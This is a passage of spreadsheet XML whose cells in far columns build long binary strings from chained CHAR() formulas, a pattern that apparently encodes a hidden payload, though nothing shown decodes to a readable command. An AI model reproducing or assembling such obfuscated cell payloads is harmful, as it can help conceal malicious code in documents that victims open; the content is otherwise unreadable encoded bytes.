HAR(61)&amp;CHAR(12)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(87)&amp;CHAR(86)&amp;CHAR(172)&amp;CHAR(133)&amp;CHAR(33)&amp;CHAR(20)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(90)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(114)&amp;CHAR(42)&amp;CHAR(132)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(23)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(124)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(237)&amp;CHAR(208)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(193)&amp;CHAR(27)&amp;CHAR(50)&amp;CHAR(134)&amp;CHAR(14)&amp;CHAR(30)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(8)&amp;CHAR(57)&amp;CHAR(153)&amp;CHAR(1)&amp;CHAR(31)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(126)&amp;CHAR(13)&amp;CHAR(137)&amp;CHAR(208)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(80)&amp;CHAR(82)&amp;CHAR(87)&amp;CHAR(140)&amp;CHAR(207)&amp;CHAR(82)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(226)&amp;CHAR(131)&amp;CHAR(237)&amp;CHAR(207)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(86)&amp;CHAR(94)&amp;CHAR(83)&amp;CHAR(130)&amp;CHAR(181)&amp;CHAR(38)</f>
        <v>_x0006_YŠA5'Qj_x0018__x0005__x0002_%Rì–_x0005__x0005__x0007_ŒÅr`’y&amp;_x001C_Ê
_x000D__x0006_r^]„F2_x0018_ÃF"_x001B__x0008__x000C__x000D__x000B_Zƒ›F&amp;_x0002__x0001_@b_x0002_
_x0005_+P€2‹v_x0002_ö™_x0011__x0007__x0001_‡Ëq1Ž_x0004__x0018_D_x000E_q)m_x000D_m_x0006_7_x0013__x0005_ý7TõZ:Ž„C_x000E__x0002__x0016_‰Äv_x0013_‚@(-‚~*$WÞ1QFõ†_x0005__x000B__x0005_‚ñWú‘™_x0007__x0005__x0011_øu&amp;/ú••_x0007__x0013__x0007_Wúq#-ú‘—_x0013__x0005__x0002_ô~Hù°C_x000C_	_x0002_“L_x0005__x0006__x000F_‹=_x000C_
_x000E_WV¬…!_x0014_
_x0007_Zí_x0005__x0011_	_x0001_ýr*„€_x001D__x0017__x0007__x0001_ý|-RíÐ_x0001__x0007_
†Á_x001B_2†_x000E__x001E__x0013__x0005_w_x0008_9™_x0001__x001F__x0007__x0003_~_x000D_‰Ðç_x0006_1ÆPRWŒÏR_x000C__x0004__x0006_âƒíÏ_x000B__x0007_
V^S‚µ&amp;</v>
      </c>
      <c r="DG81" t="str">
        <f>CHAR(216)&amp;CHAR(40)&amp;CHAR(207)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(42)&amp;CHAR(42)&amp;CHAR(121)</f>
        <v>Ø(Ï|ŸõX**y</v>
      </c>
    </row>
    <row r="82" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF82" t="str">
        <f>CHAR(245)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(82)&amp;CHAR(154)&amp;CHAR(105)&amp;CHAR(61)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(43)&amp;CHAR(122)&amp;CHAR(128)&amp;CHAR(199)&amp;CHAR(28)&amp;CHAR(131)&amp;CHAR(239)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(57)&amp;CHAR(54)&amp;CHAR(140)&amp;CHAR(76)&amp;CHAR(29)&amp;CHAR(135)&amp;CHAR(223)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(30)&amp;CHAR(37)&amp;CHAR(222)&amp;CHAR(7)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(91)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(132)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(42)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(199)&amp;CHAR(154)&amp;CHAR(78)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(142)&amp;CHAR(76)&amp;CHAR(33)&amp;CHAR(10)&amp;CHAR(199)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(41)&amp;CHAR(140)&amp;CHAR(66)&amp;CHAR(29)&amp;CHAR(4)&amp;CHAR(199)&amp;CHAR(136)&amp;CHAR(3)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(113)&amp;CHAR(45)&amp;CHAR(152)&amp;CHAR(115)&amp;CHAR(46)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(147)&amp;CHAR(45)&amp;CHAR(237)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(46)&amp;CHAR(210)&amp;CHAR(132)&amp;CHAR(203)&amp;CHAR(42)&amp;CHAR(75)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(75)&amp;CHAR(131)&amp;CHAR(10)&amp;CHAR(146)&amp;CHAR(197)&amp;CHAR(113)&amp;CHAR(240)&amp;CHAR(143)&amp;CHAR(123)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(134)&amp;CHAR(191)&amp;CHAR(46)&amp;CHAR(250)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(137)&amp;CHAR(85)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(248)&amp;CHAR(190)&amp;CHAR(33)&amp;CHAR(15)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(129)&amp;CHAR(34)&amp;CHAR(229)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(193)&amp;CHAR(133)&amp;CHAR(22)&amp;CHAR(231)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(236)&amp;CHAR(179)&amp;CHAR(46)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(238)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(41)&amp;CHAR(133)&amp;CHAR(195)&amp;CHAR(15)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(196)&amp;CHAR(254)&amp;CHAR(143)&amp;CHAR(91)&amp;CHAR(40)&amp;CHAR(16)&amp;CHAR(128)&amp;CHAR(15)&amp;CHAR(146)&amp;CHAR(135)&amp;CHAR(64)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(55)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(13)&amp;CHAR(246)&amp;CHAR(181)&amp;CHAR(38)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(223)&amp;CHAR(86)&amp;CHAR(233)&amp;CHAR(222)&amp;CHAR(26)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(54)&amp;CHAR(67)&amp;CHAR(55)&amp;CHAR(35)&amp;CHAR(137)&amp;CHAR(193)&amp;CHAR(9)&amp;CHAR(52)&amp;CHAR(93)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(60)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(250)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(120)&amp;CHAR(15)&amp;CHAR(60)&amp;CHAR(151)&amp;CHAR(47)&amp;CHAR(245)&amp;CHAR(3)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(112)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(75)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(142)&amp;CHAR(227)&amp;CHAR(14)&amp;CHAR(135)&amp;CHAR(64)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(129)&amp;CHAR(234)&amp;CHAR(18)&amp;CHAR(127)&amp;CHAR(188)&amp;CHAR(57)&amp;CHAR(197)&amp;CHAR(84)&amp;CHAR(91)&amp;CHAR(84)&amp;CHAR(90)</f>
        <v>õ_x0007_	_x0007_Rši=‰O+z€Ç_x001C_ƒï_x0005__x0005__x0007_„96ŒL_x001D_‡ß_x000D_ŽÚ_x0006__x0007__x0003_€N_x001E_%Þ_x0007_Ä[(_x001C_„O.*A_x0001__x0001_ÇšN#_x001E_ŽL!
Ç‹A")ŒB_x001D__x0004_Çˆ_x0003_Ëq-˜s._x0015_ˆ“-í_x0006__x0007__x0013_.Ò„Ë*KŽ_x000B__x0001_Kƒ
’Åqð{(_x001C_†¿.ú_x0005__x0006_!‰U7_x001A_ø¾!_x000F__x0007_	_x0001_"å_x0007__x0005__x0011_Á…_x0016_ç_x0005__x0002__x0005__x0007_ì³._x0001__x0007__x0007_	Uî
_x0001__x0005__x0002_F.)…Ã_x000F_€M&amp;_x0002_Äþ[(_x0010_€_x000F_’‡@"1ýµ7_x000E__x0005_
_x0005_€_x000D_öµ&amp;_x0001__x0004_	_x0007__x0006_ßVéÞ_x001A__x0005__x0002_6C7#‰Á	4]!_x001A_&lt;—!ú_x0005__x0002_
x_x000F_&lt;—/õ_x0003__x0016__x000C_p_x001F_K(_x001C_Žã_x000E_‡@"1ê_x0012_¼9ÅT[TZ</v>
      </c>
      <c r="DG82" t="str">
        <f>CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(41)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)</f>
        <v>¯4_x0014_)wÿÕ†Ê4</v>
      </c>
    </row>
    <row r="83" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF83" t="str">
        <f>CHAR(131)&amp;CHAR(193)&amp;CHAR(218)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(210)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(43)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(35)&amp;CHAR(28)&amp;CHAR(176)&amp;CHAR(78)&amp;CHAR(93)&amp;CHAR(251)&amp;CHAR(140)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(5)&amp;CHAR(201)&amp;CHAR(40)&amp;CHAR(202)&amp;CHAR(112)&amp;CHAR(121)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(35)&amp;CHAR(122)&amp;CHAR(4)&amp;CHAR(196)&amp;CHAR(48)&amp;CHAR(193)&amp;CHAR(113)&amp;CHAR(101)&amp;CHAR(63)&amp;CHAR(214)&amp;CHAR(58)&amp;CHAR(23)&amp;CHAR(123)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(34)&amp;CHAR(133)&amp;CHAR(245)&amp;CHAR(45)&amp;CHAR(216)&amp;CHAR(129)&amp;CHAR(251)&amp;CHAR(47)&amp;CHAR(121)&amp;CHAR(22)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(131)&amp;CHAR(1)&amp;CHAR(62)&amp;CHAR(129)&amp;CHAR(60)&amp;CHAR(43)&amp;CHAR(114)&amp;CHAR(14)&amp;CHAR(69)&amp;CHAR(67)&amp;CHAR(145)&amp;CHAR(57)&amp;CHAR(1)&amp;CHAR(119)&amp;CHAR(225)&amp;CHAR(194)&amp;CHAR(70)&amp;CHAR(17)&amp;CHAR(46)&amp;CHAR(119)&amp;CHAR(107)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(71)&amp;CHAR(4)&amp;CHAR(195)&amp;CHAR(54)&amp;CHAR(212)&amp;CHAR(63)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(21)&amp;CHAR(137)&amp;CHAR(118)&amp;CHAR(46)&amp;CHAR(101)&amp;CHAR(45)&amp;CHAR(246)&amp;CHAR(128)&amp;CHAR(241)&amp;CHAR(118)&amp;CHAR(113)&amp;CHAR(26)&amp;CHAR(134)&amp;CHAR(5)&amp;CHAR(64)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(77)&amp;CHAR(141)&amp;CHAR(50)&amp;CHAR(10)&amp;CHAR(123)&amp;CHAR(235)&amp;CHAR(141)&amp;CHAR(149)&amp;CHAR(38)&amp;CHAR(241)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(45)&amp;CHAR(89)&amp;CHAR(199)&amp;CHAR(70)&amp;CHAR(17)&amp;CHAR(106)&amp;CHAR(9)&amp;CHAR(248)&amp;CHAR(83)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(193)&amp;CHAR(118)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(111)&amp;CHAR(66)&amp;CHAR(87)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(49)&amp;CHAR(140)&amp;CHAR(193)&amp;CHAR(238)&amp;CHAR(4)&amp;CHAR(52)&amp;CHAR(218)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(237)&amp;CHAR(89)&amp;CHAR(245)&amp;CHAR(242)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(127)&amp;CHAR(45)&amp;CHAR(14)&amp;CHAR(65)&amp;CHAR(63)&amp;CHAR(251)&amp;CHAR(137)&amp;CHAR(72)&amp;CHAR(23)&amp;CHAR(137)&amp;CHAR(197)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(113)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(109)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(68)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(204)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(87)&amp;CHAR(246)&amp;CHAR(87)&amp;CHAR(13)&amp;CHAR(152)&amp;CHAR(121)&amp;CHAR(29)&amp;CHAR(137)&amp;CHAR(69)&amp;CHAR(17)&amp;CHAR(135)&amp;CHAR(204)&amp;CHAR(115)&amp;CHAR(26)&amp;CHAR(140)&amp;CHAR(11)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(87)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(120)&amp;CHAR(19)&amp;CHAR(152)&amp;CHAR(75)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(126)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(89)&amp;CHAR(10)&amp;CHAR(159)&amp;CHAR(114)&amp;CHAR(20)&amp;CHAR(137)&amp;CHAR(72)&amp;CHAR(3)&amp;CHAR(137)&amp;CHAR(197)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(113)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(109)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(68)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(204)&amp;CHAR(125)</f>
        <v>ƒÁÚ_x0008__x0007__x0005_ÒŒE&amp;+ŽN!#_x001C_°N]ûŒ_x0005_„_x0005_É(Êpy‰N#z_x0004_Ä0Áqe?Ö:_x0017_{_x0012_q/"…õ-Øû/y_x0016_€_x0003_ƒ_x0001_&gt;&lt;+r_x000E_EC‘9_x0001_wáÂF_x0011_.wkf_x0005_G_x0004_Ã6Ô?_x0002_q_x0015_‰v.e-ö€ñvq_x001A_†_x0005_@Ž_x000B__x0002_M2
{ë•&amp;ñ_x0012_
_x0007_‡A/-YÇF_x0011_j	øS!‚Áv_x0006_ˆN!oBWõS1ŒÁî_x0004_4ÚŽÃíYõòùQˆ-_x000E_A?û‰H_x0017_‰Åy_x0002__x000F_Uùq
ˆm_x0012_ŒD_x0019_ŽÌ}_x0008_‰_x0004_WöW_x000D_˜y_x001D_‰E_x0011_‡Ìs_x001A_Œ_x000B_TúW_x0001_Œx_x0013_˜K_x0012_Ë~_x0004__x0006_RôY
Ÿr_x0014_‰H_x0003_‰Åy_x0002__x000F_Uùq
ˆm_x0006_ŒD_x000D_ŽÌ}</v>
      </c>
      <c r="DG83" t="str">
        <f>CHAR(30)&amp;CHAR(219)&amp;CHAR(50)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(131)&amp;CHAR(245)&amp;CHAR(111)&amp;CHAR(85)</f>
        <v>_x001E_Û2ÖÕ†ƒõoU</v>
      </c>
    </row>
    <row r="84" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF84" t="str">
        <f>CHAR(19)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(87)&amp;CHAR(246)&amp;CHAR(87)&amp;CHAR(41)&amp;CHAR(154)&amp;CHAR(65)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(13)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(15)&amp;CHAR(154)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(204)&amp;CHAR(114)&amp;CHAR(14)&amp;CHAR(152)&amp;CHAR(4)&amp;CHAR(83)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(120)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(203)&amp;CHAR(98)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(240)&amp;CHAR(92)&amp;CHAR(4)&amp;CHAR(132)&amp;CHAR(53)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(199)&amp;CHAR(141)&amp;CHAR(101)&amp;CHAR(38)&amp;CHAR(5)&amp;CHAR(144)&amp;CHAR(202)&amp;CHAR(23)&amp;CHAR(250)&amp;CHAR(250)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(9)&amp;CHAR(195)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(190)&amp;CHAR(8)&amp;CHAR(71)&amp;CHAR(5)&amp;CHAR(145)&amp;CHAR(197)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(4)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(135)&amp;CHAR(209)&amp;CHAR(23)&amp;CHAR(10)&amp;CHAR(189)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(196)&amp;CHAR(15)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(32)&amp;CHAR(6)&amp;CHAR(245)&amp;CHAR(121)&amp;CHAR(34)&amp;CHAR(31)&amp;CHAR(252)&amp;CHAR(127)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(157)&amp;CHAR(76)&amp;CHAR(12)&amp;CHAR(253)&amp;CHAR(114)&amp;CHAR(43)&amp;CHAR(24)&amp;CHAR(92)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(245)&amp;CHAR(95)&amp;CHAR(44)&amp;CHAR(196)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(185)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(199)&amp;CHAR(31)&amp;CHAR(5)&amp;CHAR(94)&amp;CHAR(138)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(248)&amp;CHAR(112)&amp;CHAR(22)&amp;CHAR(191)&amp;CHAR(2)&amp;CHAR(66)&amp;CHAR(11)&amp;CHAR(133)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(81)&amp;CHAR(152)&amp;CHAR(115)&amp;CHAR(46)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(85)&amp;CHAR(141)&amp;CHAR(15)&amp;CHAR(236)&amp;CHAR(84)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(68)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(1)&amp;CHAR(52)&amp;CHAR(195)&amp;CHAR(85)&amp;CHAR(86)&amp;CHAR(192)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(7)&amp;CHAR(137)&amp;CHAR(204)&amp;CHAR(120)&amp;CHAR(12)&amp;CHAR(178)&amp;CHAR(13)&amp;CHAR(68)&amp;CHAR(6)&amp;CHAR(161)&amp;CHAR(233)&amp;CHAR(9)&amp;CHAR(212)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(195)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(83)&amp;CHAR(130)&amp;CHAR(235)&amp;CHAR(250)&amp;CHAR(100)&amp;CHAR(47)&amp;CHAR(138)&amp;CHAR(71)&amp;CHAR(3)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(33)&amp;CHAR(248)&amp;CHAR(102)&amp;CHAR(39)&amp;CHAR(129)&amp;CHAR(77)&amp;CHAR(13)&amp;CHAR(248)&amp;CHAR(124)&amp;CHAR(25)&amp;CHAR(249)&amp;CHAR(114)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(19)&amp;CHAR(251)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(248)&amp;CHAR(81)&amp;CHAR(39)&amp;CHAR(84)&amp;CHAR(192)&amp;CHAR(50)&amp;CHAR(12)&amp;CHAR(87)&amp;CHAR(84)&amp;CHAR(81)&amp;CHAR(231)&amp;CHAR(78)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(122)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(152)&amp;CHAR(17)&amp;CHAR(31)&amp;CHAR(83)&amp;CHAR(10)&amp;CHAR(184)&amp;CHAR(238)&amp;CHAR(47)&amp;CHAR(75)&amp;CHAR(5)</f>
        <v>_x0013_‰_x0004_WöW)šA	R€_x000D_ýT_x000F_šy_x0002_ŽK_x0003_ŒÌr_x000E_˜_x0004_SûR_x0002_„x_x0003_ˆ_x0005_ŒËb_x0004__x0003_Wð\_x0004_„5UPÇe&amp;_x0005_Ê_x0017_úú_x000B_Ž	Ã_x0006__x0005_¾_x0008_G_x0005_‘Å_x000D__x0002_³_x0004_B_x0005_‡Ñ_x0017_
½_x0004_G	…Ä_x000F__x0013_ŽF _x0006_õy"_x001F_ü-_x0016_L_x000C_ýr+_x0018_\†_x0003_õ_,Ä9_x0002_¹_x0012_J_x0007_ŠÇ_x001F__x0005_^Š~!_x0012_Œøp_x0016_¿_x0002_B_x000B_…é_x0013_Q˜s.	ŽA_x0001_U_x000F_ìT_x0006_D_x0002_„_x0001_4ÃUVÀ_x0006__x000C_F"_x0007_‰Ìx_x000C_²_x000D_D_x0006_¡é	Ô
_x0006_
_x0005__x000B_6ÉÃ
_x0005_S‚ëúd/ŠG_x0003_úw!øf'M_x000D_ø|_x0019_ùr_x000B_Ž_x0013_ûw_x0006_]WøQ'TÀ2_x000C_WTQçN_x0003__x000D__x000B_z _x0012_˜_x0011__x001F_S
¸î/K_x0005_</v>
      </c>
      <c r="DG84" t="str">
        <f>CHAR(223)&amp;CHAR(194)&amp;CHAR(42)&amp;CHAR(131)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(144)&amp;CHAR(95)&amp;CHAR(95)</f>
        <v>ßÂ*ƒÊ|×__</v>
      </c>
    </row>
    <row r="85" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF85" t="str">
        <f>CHAR(34)&amp;CHAR(206)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(141)&amp;CHAR(15)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(32)&amp;CHAR(14)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(231)&amp;CHAR(31)&amp;CHAR(71)&amp;CHAR(19)&amp;CHAR(44)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(205)&amp;CHAR(140)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(3)&amp;CHAR(251)&amp;CHAR(17)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(145)&amp;CHAR(24)&amp;CHAR(71)&amp;CHAR(3)&amp;CHAR(32)&amp;CHAR(198)&amp;CHAR(1)&amp;CHAR(222)&amp;CHAR(135)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(7)&amp;CHAR(228)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(183)&amp;CHAR(94)&amp;CHAR(29)&amp;CHAR(97)&amp;CHAR(2)&amp;CHAR(42)&amp;CHAR(220)&amp;CHAR(9)&amp;CHAR(207)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(77)&amp;CHAR(5)&amp;CHAR(233)&amp;CHAR(236)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(190)&amp;CHAR(53)&amp;CHAR(10)&amp;CHAR(71)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(196)&amp;CHAR(6)&amp;CHAR(202)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(154)&amp;CHAR(79)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(222)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(191)&amp;CHAR(11)&amp;CHAR(8)&amp;CHAR(69)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(29)&amp;CHAR(234)&amp;CHAR(222)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(191)&amp;CHAR(123)&amp;CHAR(23)&amp;CHAR(76)&amp;CHAR(13)&amp;CHAR(32)&amp;CHAR(197)&amp;CHAR(13)&amp;CHAR(204)&amp;CHAR(141)&amp;CHAR(39)&amp;CHAR(139)&amp;CHAR(73)&amp;CHAR(11)&amp;CHAR(226)&amp;CHAR(178)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(120)&amp;CHAR(19)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(45)&amp;CHAR(198)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(154)&amp;CHAR(1)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(23)&amp;CHAR(237)&amp;CHAR(160)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(190)&amp;CHAR(14)&amp;CHAR(30)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(34)&amp;CHAR(202)&amp;CHAR(5)&amp;CHAR(207)&amp;CHAR(152)&amp;CHAR(3)&amp;CHAR(139)&amp;CHAR(76)&amp;CHAR(34)&amp;CHAR(226)&amp;CHAR(130)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(178)&amp;CHAR(13)&amp;CHAR(25)&amp;CHAR(86)&amp;CHAR(12)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(199)&amp;CHAR(135)&amp;CHAR(10)&amp;CHAR(132)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(230)&amp;CHAR(120)&amp;CHAR(8)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(184)&amp;CHAR(23)&amp;CHAR(17)&amp;CHAR(71)&amp;CHAR(10)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(6)&amp;CHAR(193)&amp;CHAR(138)&amp;CHAR(4)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(239)&amp;CHAR(108)&amp;CHAR(31)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(15)&amp;CHAR(30)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(44)&amp;CHAR(220)&amp;CHAR(4)&amp;CHAR(194)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(238)&amp;CHAR(81)&amp;CHA